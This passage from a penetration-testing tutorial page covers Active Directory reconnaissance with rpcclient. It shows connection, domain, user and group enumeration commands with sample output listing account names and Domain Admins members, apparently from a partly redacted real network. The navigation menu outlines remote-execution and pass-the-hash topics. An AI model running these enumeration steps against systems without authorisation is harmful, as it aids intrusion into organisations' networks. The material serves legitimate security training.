<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-R21NVEB2EY');
    </script>
    
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploitation &mdash; tech.bitvijays.com 2.0.0 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />

  
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=51b770b3"></script>
        <script src="../_static/doctools.js?v=888ff710"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
        <script src="../_static/debug.js"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Post Exploitation" href="LFF-IPS-P4-PostExploitation.html" />
    <link rel="prev" title="Vulnerability Analysis" href="LFF-IPS-P2-VulnerabilityAnalysis.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            tech.bitvijays.com
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0F-IndustrialControlSystems.html">Industrial Control Systems</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Exploitation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#active-directory-reconnaissance">Active Directory Reconnaissance</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#rpclient">rpclient</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#connection">Connection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#version-of-the-target-windows-machine">Version of the target Windows machine</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enum-commands">Enum commands</a></li>
<li class="toctree-l4"><a class="reference internal" href="#current-domain">Current domain</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enum-domain-info">Enum Domain info</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enum-domain-users">Enum Domain users</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enum-domain-groups">Enum Domain groups</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enum-group-information-and-group-membership">Enum Group Information and Group Membership</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enumerate-specific-user-computer-information-by-rid">Enumerate specific User/ computer information by RID</a></li>
<li class="toctree-l4"><a class="reference internal" href="#domain-password-policy">Domain Password Policy</a></li>
<li class="toctree-l4"><a class="reference internal" href="#user-password-policies">User password policies</a></li>
<li class="toctree-l4"><a class="reference internal" href="#local-users">Local Users</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reset-ad-user-password">Reset AD user password</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#enum4linux">Enum4linux</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#usage">Usage</a></li>
<li class="toctree-l4"><a class="reference internal" href="#example">Example</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#active-directory-explorer-adexplorer">Active Directory Explorer (ADExplorer)</a></li>
<li class="toctree-l3"><a class="reference internal" href="#jxplorer">JXplorer</a></li>
<li class="toctree-l3"><a class="reference internal" href="#remote-server-administration-tools">Remote Server Administration Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="#nltest">nltest</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id5">Usage</a></li>
<li class="toctree-l4"><a class="reference internal" href="#verify-domain-controllers-in-a-domain">Verify domain controllers in a domain</a></li>
<li class="toctree-l4"><a class="reference internal" href="#advanced-information-about-users">Advanced information about users</a></li>
<li class="toctree-l4"><a class="reference internal" href="#determine-the-pdc-emulator-for-a-domain">Determine the PDC emulator for a domain</a></li>
<li class="toctree-l4"><a class="reference internal" href="#show-trust-relationships-for-a-domain">Show trust relationships for a domain</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#netdom">netdom</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id6">Usage</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dc">DC</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pdc">PDC</a></li>
<li class="toctree-l4"><a class="reference internal" href="#fsmo">FSMO</a></li>
<li class="toctree-l4"><a class="reference internal" href="#trust">TRUST</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ou">OU</a></li>
<li class="toctree-l4"><a class="reference internal" href="#server-workstation">SERVER/ WORKSTATION</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#microsoft-active-directory-topology-diagrammer">Microsoft Active Directory Topology Diagrammer</a></li>
<li class="toctree-l3"><a class="reference internal" href="#ad-reconnaissance-with-powershell">AD Reconnaissance with PowerShell</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#forest-information">Forest Information</a></li>
<li class="toctree-l4"><a class="reference internal" href="#domain-information">Domain Information</a></li>
<li class="toctree-l4"><a class="reference internal" href="#forest-trusts">Forest Trusts</a></li>
<li class="toctree-l4"><a class="reference internal" href="#domain-trusts">Domain Trusts</a></li>
<li class="toctree-l4"><a class="reference internal" href="#forest-global-catalogs">Forest Global Catalogs</a></li>
<li class="toctree-l4"><a class="reference internal" href="#enterprise-services-without-scanning-of-network">Enterprise Services without scanning of Network</a></li>
<li class="toctree-l4"><a class="reference internal" href="#spn-scanning">SPN-Scanning</a></li>
<li class="toctree-l4"><a class="reference internal" href="#spn-scanning-using-powershell">SPN Scanning using Powershell</a></li>
<li class="toctree-l4"><a class="reference internal" href="#find-all-registered-sql-servers-dcom-dnscache-etc">Find all registered SQL Servers, Dcom, dnscache etc.</a></li>
<li class="toctree-l4"><a class="reference internal" href="#discovering-the-service-accounts">Discovering the Service Accounts</a></li>
<li class="toctree-l4"><a class="reference internal" href="#discovering-the-computers-and-domain-controllers-without-scanning-the-network">Discovering the Computers and Domain Controllers without scanning the network</a></li>
<li class="toctree-l4"><a class="reference internal" href="#identifying-the-admin-accounts">Identifying the Admin Accounts</a></li>
<li class="toctree-l4"><a class="reference internal" href="#finding-the-admin-groups">Finding the Admin Groups</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id8">Domain Password Policy</a></li>
<li class="toctree-l4"><a class="reference internal" href="#identifying-the-groups-with-local-admin-rights-to-windows-machines">Identifying the Groups with Local Admin Rights to windows machines</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#powershell-adsisearcher-type-accelerator">PowerShell [adsiSearcher] Type Accelerator</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#define-username-password-domain-etc">Define username, password, Domain, etc.</a></li>
<li class="toctree-l4"><a class="reference internal" href="#initialize-the-connection">Initialize the connection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#finding-the-domain-name">Finding the Domain Name</a></li>
<li class="toctree-l4"><a class="reference internal" href="#finding-the-computers">Finding the Computers</a></li>
<li class="toctree-l4"><a class="reference internal" href="#finding-the-users">Finding the Users:</a></li>
<li class="toctree-l4"><a class="reference internal" href="#properties-of-the-object">Properties of the object</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#get-sessions-of-remote-machines">Get sessions of remote machines</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#powerview-get-netsession">Powerview Get-NetSession</a></li>
<li class="toctree-l4"><a class="reference internal" href="#net-session">net session</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wmi">WMI</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#view-users-in-domain-workgroup">View users in Domain / Workgroup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#powerview-get-netuser">Powerview Get-NetUser</a></li>
<li class="toctree-l4"><a class="reference internal" href="#net-user-domain">net user /domain</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id9">WMI</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#view-machines-in-domain-workgroup">View machines in Domain/ Workgroup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#powerview-get-netcomputers">Powerview Get-NetComputers</a></li>
<li class="toctree-l4"><a class="reference internal" href="#net-view-domain">net view /domain</a></li>
<li class="toctree-l4"><a class="reference internal" href="#view-machines-affected-by-gpp-vulnerability">View machines affected by GPP vulnerability</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#view-group-in-domain-workgroup">View group in Domain / Workgroup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#powerview-get-netgroupmember">Powerview Get-NetGroupMember</a></li>
<li class="toctree-l4"><a class="reference internal" href="#net-group-domain">Net group / domain</a></li>
<li class="toctree-l4"><a class="reference internal" href="#windows-resource-kit-local-global-executable">Windows Resource Kit Local/ Global executable</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bloodhound-group-memberships">BloodHound Group Memberships</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wmi-user-groups">WMI user groups</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#hunting-for-a-particular-user">Hunting for a particular User?</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#powerview-invoke-userhunter">Powerview Invoke-UserHunter</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bloodhound-users-sessions">BloodHound users_sessions</a></li>
<li class="toctree-l4"><a class="reference internal" href="#eventlog-ad">EventLog AD?</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#remote-code-execution-methods">Remote Code Execution Methods</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#winexe">Winexe</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#linux-binary-pth-winexe">Linux Binary pth-winexe</a></li>
<li class="toctree-l4"><a class="reference internal" href="#windows-binary-win-exe">Windows Binary win-exe</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#crackmapexec">crackmapexec</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id13">Usage</a></li>
<li class="toctree-l4"><a class="reference internal" href="#modules">Modules</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#smbmap">Smbmap</a></li>
<li class="toctree-l3"><a class="reference internal" href="#impacket-psexec-smbexe-wmiexec">Impacket psexec/ smbexe/ wmiexec</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#impacket-psexec">Impacket psexec</a></li>
<li class="toctree-l4"><a class="reference internal" href="#impacket-smbexec">Impacket smbexec</a></li>
<li class="toctree-l4"><a class="reference internal" href="#impacket-wmiexec">Impacket wmiexec</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#metasploit-psexec">Metasploit psexec</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#target-2-native-upload">Target 2: Native upload</a></li>
<li class="toctree-l4"><a class="reference internal" href="#target-1-powershell">Target 1, powershell</a></li>
<li class="toctree-l4"><a class="reference internal" href="#target-3-mof-upload">Target 3: MOF Upload</a></li>
<li class="toctree-l4"><a class="reference internal" href="#working-of-msf-psexec-native-upload">Working of MSF PSexec - Native Upload</a></li>
<li class="toctree-l4"><a class="reference internal" href="#working-of-msf-psexec-powershell">Working of MSF PSExec - Powershell</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#sysinternals-psexec">Sysinternals psexec</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#working-of-microsoft-psexec">Working of Microsoft PSExec</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sysinternal-psexec-with-hashes">Sysinternal PSExec with hashes</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#task-scheduler">Task Scheduler</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#examples">Examples</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#scheduled-tasks">Scheduled Tasks</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id16">Examples</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#service-controller-sc">Service Controller (SC)</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#create-a-new-service">Create a new service</a></li>
<li class="toctree-l4"><a class="reference internal" href="#start-the-service">Start the service</a></li>
<li class="toctree-l4"><a class="reference internal" href="#delete-the-service">Delete the service</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#remote-registry">Remote Registry</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#add-an-entry">Add an entry</a></li>
<li class="toctree-l4"><a class="reference internal" href="#query-the-remote-registry">Query the remote registry</a></li>
<li class="toctree-l4"><a class="reference internal" href="#delete-the-remote-registry">Delete the remote registry</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#remote-file-access">Remote File Access</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id17">Example</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#winrm">WinRM</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#enabling-ps-remoting">Enabling PS-Remoting</a></li>
<li class="toctree-l4"><a class="reference internal" href="#testing-the-winrm-connection">Testing the WinRM Connection</a></li>
<li class="toctree-l4"><a class="reference internal" href="#adding-trusted-host-in-winrm">Adding Trusted Host in WinRM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#powershell-invoke-command">PowerShell Invoke-Command</a></li>
<li class="toctree-l4"><a class="reference internal" href="#interactive-powershell-session">Interactive PowerShell session</a></li>
<li class="toctree-l4"><a class="reference internal" href="#disable-powershell-remoting">Disable Powershell Remoting</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id18">WMI</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#local-code-execution">Local code execution</a></li>
<li class="toctree-l4"><a class="reference internal" href="#remote-code-execution">Remote code execution</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#dcom">DCOM</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#dcom-applications-via-mmc-application-class-mmc20-application">DCOM applications via MMC Application Class (MMC20.Application)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dcom-via-shellexecute">DCOM via ShellExecute</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dcom-via-shellbrowserwindow">DCOM via ShellBrowserWindow</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#mimikatz-pth-ptt">Mimikatz PTH/ PTT</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#pass-the-hash">Pass the Hash</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pass-the-ticket">Pass the ticket</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#xfreerdp-remote-desktop">xfreerdp/ Remote Desktop</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#rdesktop">rdesktop</a></li>
<li class="toctree-l4"><a class="reference internal" href="#pass-the-hash-with-remote-desktop">Pass the Hash with Remote Desktop</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#useful-stuff">Useful Stuff</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#add-remove-a-local-user">Add/ remove/ a local user</a></li>
<li class="toctree-l3"><a class="reference internal" href="#add-a-domain-user">Add a domain user</a></li>
<li class="toctree-l3"><a class="reference internal" href="#add-remove-a-local-user-to-administrator-group">Add / remove a local user to administrator group</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#change-local-user-password">Change local user password</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#accessing-remote-machines">Accessing Remote machines</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#windows">Windows</a></li>
<li class="toctree-l4"><a class="reference internal" href="#linux">Linux</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#a-i-interesting-stories">A-I : Interesting Stories</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#targeting-domain-administrator">Targeting Domain Administrator!</a></li>
<li class="toctree-l3"><a class="reference internal" href="#others">Others</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#smbrelay">SMBRelay</a></li>
<li class="toctree-l4"><a class="reference internal" href="#windows-privilege-escalation">Windows Privilege Escalation</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P5-Reporting.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P4-Appendix.html">Appendix</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">tech.bitvijays.com</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Exploitation</li>
      <li class="wy-breadcrumbs-aside">
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="exploitation">
<h1>Exploitation<a class="headerlink" href="#exploitation" title="Link to this heading"></a></h1>
<p>After <strong>vulnerability analysis</strong> probably, we would have compromised a machine to have domain user credentials or administrative credentials. This blog presents information about</p>
<ul class="simple">
<li><p><a class="reference internal" href="#active-directory-reconnaissance"><span class="std std-ref">Active Directory Reconnaissance</span></a> with Domain User rights. Once, we have access to <strong>credentials of a domain user of windows domain</strong>, we can utilize the credentials to do windows <strong>active directory enumeration</strong> such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Directory Topology Diagrammer, reconnaissance using powershell etc.</p></li>
<li><p><a class="reference internal" href="#remote-code-execution-methods"><span class="std std-ref">Remote Code Execution Methods</span></a> : Once we have <strong>administrative credentials</strong> there are multiple ways to get a <strong>execute remote commands</strong> on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, scheduled tasks, service controller (sc), remote registry, WinRM, WMI, DCOM, Mimikatz Pass the hash/ Pass the ticket, remote desktop etc. We have a look over all the methods with possible examples.</p></li>
<li><p><a class="reference internal" href="#useful-stuff"><span class="std std-ref">Useful Stuff</span></a> : Also, we would have a quick look how to add/ remove/ a local/ domain user, add/ remove a local user to administrator group, accessing remote windows machines from windows/ linux.</p></li>
<li><p><a class="reference internal" href="#appendix-i-interesting-stories"><span class="std std-ref">A-I : Interesting Stories</span></a> : Presented the links of interesting blogs which might be helpful in exploitation such as blogs targeting Domain Administrator, etc.</p></li>
</ul>
<p>Did we miss something? Please send us a pull request and we will add it.</p>
<section id="active-directory-reconnaissance">
<span id="id1"></span><h2>Active Directory Reconnaissance<a class="headerlink" href="#active-directory-reconnaissance" title="Link to this heading"></a></h2>
<section id="rpclient">
<h3>rpclient<a class="headerlink" href="#rpclient" title="Link to this heading"></a></h3>
<p>eskoudis presents great amount of information at <a class="reference external" href="https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">Plundering Windows Account Infor via Authenticated SMB Session</a>.  carnal0wnage have written <a class="reference external" href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html">Enumerating user accounts on linux and OSX</a> and BlackHills have written <a class="reference external" href="http://www.blackhillsinfosec.com/?p=4645">Password Spraying and Other Fun with RPC Client</a> Most of the stuff has been taken from the above three.</p>
<p>The below commands tell how to figure out</p>
<section id="connection">
<h4>Connection<a class="headerlink" href="#connection" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient -U xxxxs.hxxxx.net/mlxxxxh 10.0.65.103</span>
</pre></div>
</div>
</section>
<section id="version-of-the-target-windows-machine">
<h4>Version of the target Windows machine<a class="headerlink" href="#version-of-the-target-windows-machine" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; srvinfo</span>
<span class="go">10.0.65.103    Wk Sv BDC Tim NT</span>
<span class="go">platform_id     :       500</span>
<span class="go">os version      :       6.3</span>
<span class="go">server type     :       0x801033</span>
</pre></div>
</div>
</section>
<section id="enum-commands">
<h4>Enum commands<a class="headerlink" href="#enum-commands" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; enum</span>

<span class="go">enumalsgroups  enumdomains    enumdrivers    enumkey     enumprivs</span>
<span class="go">enumdata       enumdomgroups  enumforms      enumports   enumtrust</span>
<span class="go">enumdataex     enumdomusers   enumjobs       enumprinter</span>
</pre></div>
</div>
</section>
<section id="current-domain">
<h4>Current domain<a class="headerlink" href="#current-domain" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">enumdomains</span>
<span class="go">name:[xxxx] idx:[0x0]</span>
<span class="go">name:[Builtin] idx:[0x0]</span>
</pre></div>
</div>
</section>
<section id="enum-domain-info">
<h4>Enum Domain info<a class="headerlink" href="#enum-domain-info" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; querydominfo</span>
<span class="go">Domain               :  xxxx</span>
<span class="go">Server               :  HMC_PDC-TEMP</span>
<span class="go">Comment              :</span>
<span class="go">Total Users          :  9043</span>
<span class="go">Total Groups         :  0</span>
<span class="go">Total Aliases        :  616</span>
<span class="go">Sequence No          :  1</span>
<span class="go">Force Logoff         : -1</span>
<span class="go">Domain Server State  :  0x1</span>
<span class="go">Server Role          :  ROLE_DOMAIN_BDC</span>
<span class="go">Unknown 3           :    0x1</span>
</pre></div>
</div>
</section>
<section id="enum-domain-users">
<h4>Enum Domain users<a class="headerlink" href="#enum-domain-users" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; enumdomusers</span>
<span class="go">user:[administrator] rid:[0x1f4]</span>
<span class="go">user:[Guest] rid:[0x1f5]</span>
<span class="go">user:[krbtgt] rid:[0x1f6]</span>
<span class="go">user:[_STANDARD] rid:[0x3ee]</span>
<span class="go">user:[Install] rid:[0x3fa]</span>
<span class="go">user:[sko] rid:[0x43a]</span>
<span class="go">user:[cap] rid:[0x589]</span>
<span class="go">user:[zentrale] rid:[0x67f]</span>
<span class="go">user:[dbserver] rid:[0x7d9]</span>
<span class="go">user:[JVOO] rid:[0x7fa]</span>
<span class="go">user:[Standard HMC User Te] rid:[0x8a0]</span>
<span class="go">user:[event] rid:[0x8d5]</span>
<span class="go">user:[remote] rid:[0x9ea]</span>
<span class="go">user:[pda-vis1] rid:[0xb65]</span>
<span class="go">user:[TestUser] rid:[0xc46]</span>
<span class="go">user:[oeinstall] rid:[0x1133]</span>
<span class="go">user:[repro] rid:[0x13c3]</span>
</pre></div>
</div>
</section>
<section id="enum-domain-groups">
<h4>Enum Domain groups<a class="headerlink" href="#enum-domain-groups" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; enumdomgroups</span>
<span class="go">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</span>
<span class="go">group:[Domain Admins] rid:[0x200]</span>
<span class="go">group:[Domain Users] rid:[0x201]</span>
<span class="go">group:[Domain Guests] rid:[0x202]</span>
<span class="go">group:[Domain Computers] rid:[0x203]</span>
<span class="go">group:[Domain Controllers] rid:[0x204]</span>
<span class="go">group:[Schema Admins] rid:[0x206]</span>
<span class="go">group:[Enterprise Admins] rid:[0x207]</span>
<span class="go">group:[Group Policy Creator Owners] rid:[0x208]</span>
<span class="go">group:[Read-only Domain Controllers] rid:[0x209]</span>
<span class="go">group:[Cloneable Domain Controllers] rid:[0x20a]</span>
<span class="go">group:[Protected Users] rid:[0x20d]</span>
<span class="go">group:[xxxx Users] rid:[0x4d8]</span>
<span class="go">group:[IC Members] rid:[0x50d]</span>
<span class="go">group:[Event Management] rid:[0x8d7]</span>
<span class="go">group:[SMSInternalCliGrp] rid:[0x9f5]</span>
<span class="go">group:[IT Support] rid:[0x105b]</span>
</pre></div>
</div>
</section>
<section id="enum-group-information-and-group-membership">
<h4>Enum Group Information and Group Membership<a class="headerlink" href="#enum-group-information-and-group-membership" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; querygroup 0x200</span>
<span class="go">Group Name:     Domain Admins</span>
<span class="go">Description:    Designated administrators of the domain</span>
<span class="go">Group Attribute:7</span>
<span class="go">Num Members:16</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rpcclient $&gt; querygroupmem 0x200</span>
<span class="go">rid:[0x2227] attr:[0x7]</span>
<span class="go">rid:[0x3601] attr:[0x7]</span>
<span class="go">rid:[0x36aa] attr:[0x7]</span>
<span class="go">rid:[0x36e0] attr:[0x7]</span>
<span class="go">rid:[0x3c23] attr:[0x7]</span>
<span class="go">rid:[0x5528] attr:[0x7]</span>
<span class="go">rid:[0x1f4]  attr:[0x7]</span>
<span class="go">rid:[0x363b] attr:[0x7]</span>
<span class="go">rid:[0x573e] attr:[0x7]</span>
<span class="go">rid:[0x56bc] attr:[0x7]</span>
<span class="go">rid:[0x5e5e] attr:[0x7]</span>
<span class="go">rid:[0x7fe1] attr:[0x7]</span>
<span class="go">rid:[0x86d9] attr:[0x7]</span>
<span class="go">rid:[0x9367] attr:[0x7]</span>
<span class="go">rid:[0x829c] attr:[0x7]</span>
<span class="go">rid:[0xa26e] attr:[0x7]</span>
</pre></div>
</div>
</section>
